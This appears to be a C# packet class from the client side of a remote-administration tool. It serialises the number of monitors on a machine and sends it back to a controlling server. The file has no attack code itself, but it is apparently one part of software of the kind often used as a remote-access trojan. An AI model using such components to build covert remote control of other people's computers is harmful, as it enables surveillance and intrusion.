using ProtoBuf;

namespace xClient.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class MonitorsResponse : IPacket
    {
        [ProtoMember(1)]
        public int Number { get; set; }

        public MonitorsResponse()
        {
        }

        public MonitorsResponse(int number)
        {
            this.Number = number;
        }

        public void Execute(Client client)
        {
            client.Send<MonitorsResponse>(this);
        }
    }
}